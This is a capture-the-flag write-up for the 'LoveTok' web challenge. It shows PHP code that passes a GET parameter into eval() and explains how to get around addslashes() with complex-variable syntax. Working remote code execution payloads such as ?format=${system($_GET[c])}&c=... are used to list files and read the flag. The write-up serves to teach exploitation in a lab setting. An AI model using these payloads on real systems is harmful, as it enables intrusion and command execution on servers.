# LoveTok

True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛

<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

If we try to change the GET parameter manually we obtain different results:

<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

If we inspect the code:

{% code title="TimeModel.php" overflow="wrap" %}
```php
<?php
class TimeModel
{
public function __construct($format)
{ 
$this->format = addslashes($format);

[ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
$this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
}

public function getTime()
{
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
return isset($time) ? $time : 'Something went terribly wrong';
}
}
```
{% endcode %}

The function `addslashes()` return a string with backslashes in front of predefined characters.

The predefined characters are:

* single quote (')
* double quote (")
* backslash (\\)
* NULL

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Here the vulnerable code is this single line:

{% code overflow="wrap" %}
```php
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```
{% endcode %}

Just like SQL injection, we should be able to end the quote and add our malicious code into the eval() as shown below. The highlighted part of the code is the value I could have added from my parameter to end the quote and do a system call resulting in RCE:

{% code overflow="wrap" fullWidth="true" %}
```php
eval('$time = date("");system("ls /")//", strtotime("'' . $this->prediction . '"));');
                    ^^^^^^^^^^^^^^^^^^^

```
{% endcode %}

Just remember that there is an `addslashes()` that will sanitize our input. We may use other ways to bypass it. Use of URL encoding will not work as $\_GET will automatically decode our encoding before running addslashes(). I came across an interesting article to bypass addslashes() using a _<mark style="color:red;">**complex variable**</mark>_. Basically, complex variables will utilize:

* double quotes (“)
* &#x20;$ variable in them&#x20;
* {} barriers.

<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

First we can try to execute `phpinfo()` function using complex variable syntax:

<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

If we try to use directly the command that we want to execute we receive a blank page because the `addslashes()` break the code with escaping single quote:

<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

```
?format=${system($_GET[c])}&c=ls -lah
```

<figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

We can see the prettyfied output using CTRL+U:

<figure><img src="../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

List files under root directory:

```
?format=${system($_GET[c])}&c=ls -lah /
```

<figure><img src="../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

Print the content of flag:

```
?format=${system($_GET[c])}&c=cat /flagUUR3k
```

<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
